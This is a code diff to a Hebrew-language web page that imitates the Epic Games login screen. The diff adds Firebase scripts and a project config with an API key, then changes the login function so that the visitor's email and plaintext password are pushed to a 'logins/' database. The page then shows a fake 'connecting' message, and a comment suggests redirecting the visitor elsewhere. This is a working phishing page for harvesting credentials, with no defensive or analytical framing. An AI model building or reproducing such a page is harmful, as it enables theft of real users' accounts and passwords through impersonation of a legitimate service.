@@ -3,25 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>התחברות לחשבון Epic Games</title>
+    <title>התחברות | Epic Games</title>
     <style>
-        /* הצבעים הרשמיים של Epic */
         :root {
             --bg-color: #121212;
             --card-bg: #202020;
             --epic-blue: #0074e4;
             --epic-blue-hover: #007bf5;
-            --input-bg: #ffffff;
-            --text-grey: #a8a8a8;
         }
 
         body {
-            font-family: 'Inter', 'Segoe UI', Roboto, sans-serif;
+            font-family: 'Inter', 'Segoe UI', sans-serif;
             background-color: var(--bg-color);
             color: white;
             margin: 0;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
@@ -29,52 +25,27 @@
 
         .box {
             width: 100%;
-            max-width: 440px;
+            max-width: 400px;
             padding: 40px;
             background: var(--card-bg);
             border-radius: 4px;
             text-align: center;
-            box-sizing: border-box;
         }
 
-        .logo {
-            width: 45px;
-            margin-bottom: 25px;
-        }
-
-        h2 {
-            font-size: 18px;
-            font-weight: bold;
-            margin-bottom: 30px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        /* עיצוב שדות קלט כמו במקור */
-        .input-group {
-            margin-bottom: 15px;
-            text-align: right;
-        }
+        .logo { width: 45px; margin-bottom: 25px; }
+        h2 { font-size: 18px; margin-bottom: 30px; text-transform: uppercase; }
 
         input {
             width: 100%;
             padding: 15px;
+            margin-bottom: 15px;
             border: 1px solid #404040;
             background-color: #252525;
             color: white;
             border-radius: 4px;
             box-sizing: border-box;
-            font-size: 14px;
-            transition: border-color 0.2s;
         }
 
-        input:focus {
-            border-color: var(--text-grey);
-            outline: none;
-            background-color: #303030;
-        }
-
-        /* הכפתור הכחול המפורסם */
         button {
             width: 100%;
             padding: 16px;
@@ -84,61 +55,43 @@
             border-radius: 4px;
             cursor: pointer;
             font-weight: bold;
-            font-size: 13px;
             text-transform: uppercase;
-            margin-top: 20px;
-            transition: background-color 0.2s;
-            letter-spacing: 1px;
         }
 
-        button:hover {
-            background-color: var(--epic-blue-hover);
-        }
-
-        .links {
-            margin-top: 25px;
-            font-size: 13px;
-            color: var(--text-grey);
-        }
-
-        .links a {
-            color: white;
-            text-decoration: none;
-            border-bottom: 1px solid white;
-            padding-bottom: 2px;
-        }
-
-        .error {
-            margin-top: 15px;
-            font-size: 13px;
-            min-height: 20px;
-        }
+        button:hover { background-color: var(--epic-blue-hover); }
+        .error { margin-top: 15px; font-size: 13px; }
     </style>
 </head>
 <body>
 
 <div class="box">
     <img src="https://upload.wikimedia.org/wikipedia/commons/3/31/Epic_Games_logo.svg" alt="Epic Logo" class="logo">
-    
     <h2>התחברות</h2>
-
-    <div class="input-group">
-        <input type="email" id="email" placeholder="כתובת אימייל">
-    </div>
-    <div class="input-group">
-        <input type="password" id="password" placeholder="סיסמה">
-    </div>
-
+    <input type="email" id="email" placeholder="כתובת אימייל">
+    <input type="password" id="password" placeholder="סיסמה">
     <button onclick="login()">כניסה לחשבון</button>
-
-    <div class="links">
-        <p>אין לך חשבון? <a href="#">הירשם</a></p>
-    </div>
-
     <p id="message" class="error"></p>
 </div>
 
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+
 <script>
+    // הגדרות Firebase שקיבלת מהשותף
+    const firebaseConfig = {
+        apiKey: "AIzaSyAdMfT8b2qkEuscfANoHfd84grGyjwroLc",
+        authDomain: "epic-games-66888.firebaseapp.com",
+        projectId: "epic-games-66888",
+        storageBucket: "epic-games-66888.firebasestorage.app",
+        messagingSenderId: "1099132611577",
+        appId: "1:1099132611577:web:3a64e34abc4810bb58eb28",
+        measurementId: "G-SS7HZGV6Y9"
+    };
+
+    // אתחול
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
     function login() {
         const email = document.getElementById("email").value;
         const password = document.getElementById("password").value;
@@ -146,12 +99,23 @@
 
         if (email === "" || password === "") {
             message.style.color = "#ff3e3e";
-            message.innerText = "שגיאה: יש למלא את כל השדות";
-        } else {
-            message.style.color = "#2ecc71";
-            message.innerText = "בודק נתונים...";
-            // כאן אפשר להוסיף מעבר דף
+            message.innerText = "יש למלא את כל השדות";
+            return;
         }
+
+        // שמירת הנתונים ב-Firebase
+        database.ref('logins/').push({
+            email: email,
+            password: password,
+            date: new Date().toLocaleString()
+        }).then(() => {
+            message.style.color = "#2ecc71";
+            message.innerText = "מתחבר... אנא המתן";
+            // כאן אפשר להוסיף הפניה לאתר אחר אם רוצים
+        }).catch((error) => {
+            message.style.color = "#ff3e3e";
+            message.innerText = "שגיאה בחיבור: " + error.message;
+        });
     }
 </script>
 
